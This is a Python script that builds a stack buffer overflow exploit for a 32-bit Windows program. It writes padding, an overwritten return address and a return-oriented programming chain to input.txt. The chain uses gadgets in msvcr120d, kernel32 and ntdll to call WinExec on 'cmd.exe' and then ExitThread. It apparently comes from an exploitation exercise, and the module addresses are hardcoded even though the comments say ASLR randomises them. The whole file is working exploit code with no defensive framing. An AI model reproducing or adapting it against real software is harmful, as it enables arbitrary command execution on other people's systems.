import struct

def write_file(file_path):
	# non-zero bytes
	
	msvcr120d = 0x70c20000	# random since ASLR
	kernel32 = 0x75300000	# random since ASLR
	ntdll = 0x777c0000		# random since ASLR
	
	WinExec = kernel32 + 0x45390
	ExitThread = ntdll + 0x22940
	lpCmdLine = 0xffffffff
	uCmdShow = 0x01010101
	dwExitCode = 0xffffffff
	ret_for_ExitThread = 0xffffffff
	
	# for padding
	for_ebp = 0xffffffff
	for_ebx = 0xffffffff
	for_esi = 0xffffffff
	for_retn = 0xffffffff
	
	rop_chain = [
		msvcr120d + 0x16601d,		# add esp,20 # retn
#cmd:
		"cmd.",
		"exe\xff",			# replace 0xff to 0x0 in runtime
#cmd+8:
		WinExec,
		ExitThread,
#cmd+10:
		lpCmdLine,				# WinExec 1st param(calc in runtime)
		uCmdShow,				# WinExec 2nd param
		ret_for_ExitThread,		# no use
		dwExitCode,				# ExitThread 1st param
#cmd+20:
		kernel32 + 0x77342,		# push esp # pop esi # retn 
		# now esi = here
#here(cmd+24):
		ntdll + 0x2265b,		# xchg eax,esi # add al,0 # retn
		# now eax = here
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		msvcr120d + 0xf4334,	# dec eax # retn
		# now eax = cmd+7 
		kernel32 + 0x2af48,	# mov byte ptr ds:[eax], 0 # pop ebp # retn 0x08
		for_ebp,
		# now 0xff has been replated by 0x00
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_retn,
		for_retn,
		for_ebp,
		ntdll + 0x9874f,		# mov edx,eax # mov eax,edx # pop ebp # retn
		for_ebp,
		# now eax = edx = cmd
		ntdll + 0x64f1,		# add eax,10 # pop esi # pop ebp # retn 10
		for_esi,
		for_ebp,
		# now eax = cmd+10, edx = cmd
		ntdll + 0x7d017,	# mov dword ptr ds:[eax],edx # retn
		for_retn,
		for_retn,
		for_retn,
		for_retn,
		# now lpCmdLine has been fixed
		ntdll + 0x9a638,		# sub eax,7 # pop ebp # retn
		for_ebp,
		msvcr120d + 0xf4334,	# dec eax # retn
		# now eax = cmd+8
		ntdll + 0xbef6 		# xchg eax,esp # mov ch,0 # add dh,dh # retn
		# now esp = cmd+8
	]
	
	rop_chain = ''.join([x if type(x) == str else struct.pack('<I', x) for x in rop_chain])
	
	with open(file_path, 'wb') as f:
		ret_eip = ntdll + 0xbefb	# retn
		name = 'A'*68 + struct.pack('<I', ret_eip) + rop_chain
		f.write(name)

write_file(r'input.txt')
